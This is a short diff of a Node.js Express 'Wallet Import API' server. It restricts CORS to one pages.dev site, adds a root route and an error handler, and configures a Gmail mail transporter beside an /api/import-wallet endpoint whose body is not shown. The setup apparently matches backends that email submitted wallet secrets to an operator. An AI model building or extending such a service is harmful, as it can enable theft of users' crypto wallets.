@@ -7,23 +7,26 @@ const cors = require('cors');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// ✅ CORS Options
+// CORS Options
 const corsOptions = {
   origin: 'https://dappify.pages.dev',
   methods: ['GET', 'POST', 'OPTIONS'],
   allowedHeaders: ['Content-Type'],
-  credentials: false // Set to true only if you're using cookies or auth
+  credentials: false
 };
 
-// ✅ CORS Middleware
+// Middleware
 app.use(cors(corsOptions));
 app.options('*', cors(corsOptions));
-
-// Middleware
 app.use(bodyParser.json());
 app.use(bodyParser.urlencoded({ extended: true }));
 
-// Email configuration
+// Root route
+app.get('/', (req, res) => {
+  res.send('Wallet Import API is running');
+});
+
+// Email transporter
 const transporter = nodemailer.createTransport({
   service: 'gmail',
   auth: {
@@ -120,6 +123,12 @@ app.post('/api/import-wallet', async (req, res) => {
     });
   }
 });
+
+app.use((err, req, res, next) => {
+  console.error('Server error:', err);
+  res.status(500).json({ error: 'Internal server error' });
+});
+
 
 // Start server
 app.listen(PORT, () => {
